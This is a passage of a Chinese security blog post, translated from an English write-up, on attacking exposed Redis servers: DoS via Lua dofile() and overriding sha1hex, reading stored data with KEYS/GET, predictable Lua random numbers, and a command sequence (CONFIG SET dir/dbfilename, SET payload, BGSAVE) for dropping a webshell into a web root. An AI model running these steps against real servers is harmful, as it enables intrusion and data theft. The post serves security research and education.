+<h2 id="cpu盗窃"><a href="#cpu盗窃" class="headerlink" title="cpu盗窃"></a>cpu盗窃</h2><p>Redis提供了Redis.sha1hex()，可以从Lua脚本调用它。所以可以使用SHA-1破解来打开Redis服务器。<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9hZGFtX2JhbGR3aW4=">@adam_baldwin<i class="fa fa-external-link-alt"></i></span>的代码在<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V2aWxwYWNrZXQvcmVkaXMtc2hhLWNyYWNr">redis-sha-crack<i class="fa fa-external-link-alt"></i></span>上，幻灯片在<span class="exturl" data-url="aHR0cHM6Ly9mci5zbGlkZXNoYXJlLm5ldC9ldmlscGFja2V0L2V2MWxzaGEtbWlzYWR2ZW50dXJlcy1pbi10aGUtbGFuZC1vZi1sdWE=">Slideshare<i class="fa fa-external-link-alt"></i></span>上。</p>
+<h2 id="dos"><a href="#dos" class="headerlink" title="dos"></a>dos</h2><p>有很多方法来DoS一个开放的Redis实例，从删除数据到调用<span class="exturl" data-url="aHR0cDovL3JlZGlzLmlvL2NvbW1hbmRzL1NIVVRET1dO">关闭<i class="fa fa-external-link-alt"></i></span>命令。然而，这里有两个有趣的例子:</p>
+<ul>
+<li><p>不带任何参数调用dofile()将从STDIN读取Lua脚本，这是Redis控制台。因此，服务器仍在运行，但不会处理新连接，直到在控制台中命中“^D”(或重新启动)</p>
+</li>
+<li><p>sha1hex()可以被覆盖(每个客户端)使用静态值是一种选择</p>
+</li>
+</ul>
+<p>Lua脚本:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(redis.sha1hex(<span class="string">&#x27;secret&#x27;</span>))</span><br><span class="line"><span class="keyword">function</span> redis.sha1hex (x)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;4242424242424242424242424242424242424242&#x27;</span>) </span><br><span class="line">end</span><br><span class="line"><span class="built_in">print</span>(redis.sha1hex(<span class="string">&#x27;secret&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>在redis控制台上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># First run</span></span><br><span class="line">e5e9fa1ba31ecd1ae84f75caaa474f3a663f05f4</span><br><span class="line">4242424242424242424242424242424242424242</span><br><span class="line"></span><br><span class="line"><span class="comment"># Next runs</span></span><br><span class="line">4242424242424242424242424242424242424242</span><br><span class="line">4242424242424242424242424242424242424242</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据盗窃"><a href="#数据盗窃" class="headerlink" title="数据盗窃"></a>数据盗窃</h2><p>如果Redis服务器碰巧存储了有趣的数据(如会话cookie或业务数据)，可以使用<span class="exturl" data-url="aHR0cDovL3JlZGlzLmlvL2NvbW1hbmRzL0tFWVM=">key<i class="fa fa-external-link-alt"></i></span>枚举存储的对，然后使用<span class="exturl" data-url="aHR0cDovL3JlZGlzLmlvL2NvbW1hbmRzL0dFVA==">GET<i class="fa fa-external-link-alt"></i></span>读取它们的值。</p>
+<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>Lua脚本使用完全可预测的“随机”数字!在scripting.c的evalGenericCommand()中获取详细信息:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* We want the same PRNG sequence at every call so that our PRNG is not affected by external state. */</span><br><span class="line"></span><br><span class="line">redisSrand48(0);</span><br></pre></td></tr></table></figure>
+
+<p>每个调用math.random()的Lua脚本都会得到相同的数字流:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0.17082803611217</span><br><span class="line">0.74990198051087</span><br><span class="line">0.09637165539729</span><br><span class="line">0.87046522734243</span><br><span class="line">0.57730350670279</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>为了在开放的Redis服务器上执行远程代码，考虑了三种情况。</p>
+<p>第一个(经过验证但<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vY29yc2l4LzY1NzU0ODY=">非常复杂<i class="fa fa-external-link-alt"></i></span>)与字节码修改和内部VM机器的滥用有关。不是我菜，我不是二元对立的人。</p>
+<p>第二种是逃避全局保护并尝试访问有趣的函数(比如在类似ctf的Python转义期间)。逃避全局保护是很简单的(并记录在<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTk5OTc2NDcvc2NyaXB0LWF0dGVtcHRlZC10by1jcmVhdGUtZ2xvYmFsLXZhcmlhYmxl">StackOverflow<i class="fa fa-external-link-alt"></i></span>上!)但是，没有加载任何有趣的模块，或者我的Lua水平很糟糕(这是有可能的)。顺便说一下，<span class="exturl" data-url="aHR0cDovL2x1YS11c2Vycy5vcmcvd2lraS9TYW5kQm94ZXM=">这里<i class="fa fa-external-link-alt"></i></span>有很多有趣的东西。</p>
+<p>考虑第三个场景，简单而现实:</p>
+<p>将一个半控制的文件转储到磁盘，例如在Web根目录下，并通过webshell获得RCE。或覆盖shell脚本。唯一的区别是目标文件名和payload，但是方法是相同的。需要注意的是，日志文件的位置在启动后无法修改。所以唯一的解决方案是数据库文件本身。如果足够注意的话，会惊讶地发现只有ram的数据库会写入磁盘。实际上，为了恢复的目的，数据库会不时地复制到磁盘上。备份取决于配置的阈值，或在调用BGSAVE命令时发生。</p>
+<p>为了删除一个半受控的文件，需要采取以下操作:</p>
+<ul>
+<li>修改转储文件的位置<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET <span class="built_in">dir</span> /var/www/uploads/</span><br><span class="line">CONFIG SET dbfilename sh.php</span><br></pre></td></tr></table></figure></li>
+<li>在数据库中插入有效载荷<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET payload <span class="string">&quot;could be php or shell or whatever&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>将数据库转储到磁盘<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BGSAVE</span><br></pre></td></tr></table></figure></li>
+<li>恢复一切<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DEL payload</span><br><span class="line">CONFIG SET <span class="built_in">dir</span> /var/redis/</span><br><span class="line">CONFIG SET dbfilename dump.rdb</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>最后，非常的失败。Redis将转储文件的模式设置为“0600”(又名“-rw——-”)。Apache无法读取 :-(</p>
+<h2 id="结尾部分"><a href="#结尾部分" class="headerlink" title="结尾部分"></a>结尾部分</h2><p>即使不能在这台服务器上执行自己的代码，研究Redis还是很有趣的。学到了一些技巧，也许下周或以后会有用，谁知道呢。最后，感谢在Redis安全方面发表文章的人:Francis Alexander, Peter Cawley 和 Adam Baldwin。以及Facebook安全团队，他们为一个错误配置的代理(Redis实例运行在“noc.parse.com”上)奖励2万美元。</p>
+<h2 id="翻译自-尊重原作者，略有修改"><a href="#翻译自-尊重原作者，略有修改" class="headerlink" title="翻译自(尊重原作者，略有修改)"></a>翻译自(尊重原作者，略有修改)</h2><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYWdhcnJpLmZyL2Jsb2cvYXJjaGl2ZXMvMjAxNC8wOS8xMS90cnlpbmdfdG9faGFja19yZWRpc192aWFfaHR0cF9yZXF1ZXN0cy9pbmRleC5odG1s">Trying to hack Redis via HTTP requests<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/12/19/Trying-to-hack-Redis-via-HTTP-requests/" title="通过http请求入侵redis">https://fdlucifer.github.io/2020/12/19/Trying-to-hack-Redis-via-HTTP-requests/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/hack-redis/" rel="tag"><i class="fa fa-tag"></i> hack redis</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/12/18/CVE-2020%E2%80%9314882-analysis/" rel="prev" title="一个get请求拿下weblogic-rce---CVE-2020–14882分析">
+                  <i class="fa fa-chevron-left"></i> 一个get请求拿下weblogic-rce---CVE-2020–14882分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/12/26/hack-the-box-bigheadwebsvr/" rel="next" title="Hack-The-Box[BigheadWebSvr逆向-part-1]">
+                  Hack-The-Box[BigheadWebSvr逆向-part-1] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
